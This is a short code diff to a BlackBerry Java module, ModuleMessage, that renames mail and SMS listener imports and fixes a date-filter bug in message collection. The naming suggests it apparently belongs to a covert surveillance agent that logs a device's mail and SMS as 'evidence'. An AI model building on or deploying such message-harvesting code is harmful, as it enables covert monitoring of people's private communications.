@@ -19,14 +19,6 @@ import net.rim.blackberry.api.mail.Message;
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.ModuleManager;
-import blackberry.agent.mail.Filter;
-import blackberry.agent.mail.Mail;
-import blackberry.agent.mail.MailListener;
-import blackberry.agent.mail.MailParser;
-import blackberry.agent.mail.Prefix;
-import blackberry.agent.sms.SmsListener;
-import blackberry.agent.sms.SmsListener45;
-import blackberry.agent.sms.SmsListener46;
 import blackberry.config.ChildConf;
 import blackberry.config.ConfModule;
 import blackberry.config.ConfigurationException;
@@ -37,6 +29,14 @@ import blackberry.evidence.EvidenceType;
 import blackberry.evidence.TimestampMarkup;
 import blackberry.interfaces.MailObserver;
 import blackberry.interfaces.SmsObserver;
+import blackberry.module.mail.Filter;
+import blackberry.module.mail.Mail;
+import blackberry.module.mail.MailListener;
+import blackberry.module.mail.MailParser;
+import blackberry.module.mail.Prefix;
+import blackberry.module.sms.SmsListener;
+import blackberry.module.sms.SmsListener45;
+import blackberry.module.sms.SmsListener46;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
@@ -145,7 +145,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             ChildConf mailFilter = mailJson.getChild("filter");
             mailHistory = mailFilter.getBoolean("history");
             mailFrom = mailFilter.getDate("datefrom");
-            mailTo = mailFilter.getDate("datefrom");
+            mailTo = mailFilter.getDate("dateto");
 
             int maxSizeToLog = 4096;
             filterEmailCollect = new Filter(mailHistory, mailFrom, mailTo,
